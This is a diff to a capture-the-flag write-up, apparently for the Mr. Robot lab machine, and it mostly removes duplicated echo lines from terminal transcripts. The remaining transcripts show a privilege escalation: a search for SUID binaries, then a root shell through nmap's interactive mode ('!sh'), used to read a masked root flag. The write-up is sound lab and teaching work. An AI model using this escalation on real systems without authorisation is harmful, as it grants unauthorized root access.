@@ -317,10 +317,8 @@ su robot
 Password: **************************
 
 robot@linux:~$ pwd     
-pwd
 /home/robot
 robot@linux:~$ cat key-2-of-3.txt
-cat key-2-of-3.txt
 82*****56184f694993bede3e*****59
 ````
 
@@ -328,12 +326,10 @@ Looked with `sudo -l`, nothing. `crontab -l` also did not give anything.
 
 ````commandline
 robot@linux:~$ sudo -l
-sudo -l
 [sudo] password for robot: abcdefghijklmnopqrstuvwxyz
 
 Sorry, user robot may not run sudo on linux.
 robot@linux:~$ crontab -l
-crontab -l
 no crontab for robot
 ````
 
@@ -343,10 +339,8 @@ The short ways is:
 
 ````commandline
 robot@linux:~$ whereis nmap
-whereis nmap
 nmap: /usr/local/bin/nmap
 robot@linux:~$ ls -lah /usr/local/bin/nmap
-ls -lah /usr/local/bin/nmap
 -rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
 ````
 
@@ -354,7 +348,6 @@ But I took the long way.
 
 ````commandline
 robot@linux:~$ find / -perm +6000 2>/dev/null | grep '/bin/'
-find / -perm +6000 2>/dev/null | grep '/bin/'
 /bin/ping
 /bin/umount
 /bin/mount
@@ -383,22 +376,14 @@ So `nmap` has the `SUID` bit set on. Looked on the [GTFOBins about nmap](https:/
 
 ````commandline
 robot@linux:~$ nmap --interactive
-nmap --interactive
 
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
 nmap> !sh
-!sh
 # cd /root
-cd /root
 # ls
-ls
 firstboot_done  key-3-of-3.txt
-# cat key-3-3.txt
-cat key-3-3.txt
-cat: key-3-3.txt: No such file or directory
 # cat key-3-of-3.txt
-cat key-3-of-3.txt
 04*****ef27c3dee1ee161b2*****4e4
 ````
 
